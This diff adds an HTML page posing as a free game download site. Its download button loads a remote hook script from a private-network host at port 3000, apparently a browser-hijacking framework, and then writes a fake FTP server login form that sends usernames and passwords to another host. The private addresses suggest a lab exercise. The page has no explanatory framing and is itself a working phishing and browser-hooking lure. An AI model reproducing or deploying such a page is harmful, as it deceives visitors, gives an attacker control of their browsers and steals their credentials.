@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+<title>Game Download</title>
+<meta charset="utf-8" />
+</head>
+<h3>The world's biggest free game download site</h3>
+
+<input type="search" id="mySearch" placeholder="Assassin's Creed IV">
+
+<p>Click the button to download the game.</p>
+
+<button onclick="myFunction()">Download for free</button>
+<script>
+function myFunction() {
+    var x = document.getElementById("mySearch").value;
+ document.write('<script type="text/javascript" src="http://192.168.93.129:3000/hook.js"></script\>');
+var person = prompt("Please enter your name", "Man Fu Lei");
+
+document.writeln('<h2>Search result for </h2>');
+document.writeln(x);
+document.writeln('<h3>Welcome to ArGosoft FTP Server 1.0.2.1</h3>');
+document.write(x + " not found. Login to further search the ftp server.");
+document.writeln('<p id="demo"></p>');
+document.getElementById("demo").innerHTML =
+        "Hello " + person + "! Please login first!";
+document.writeln('<form action="ftp://192.168.93.135">');
+document.writeln("username  "+'<input name="tfSearch" type="text">');
+document.writeln("Password:  "+'<input type="password" value="psw123">');
+    document.writeln('<input type="submit" value="login">');
+document.writeln('</form>');
+
+}
+</script>     
+</body>
+</html>
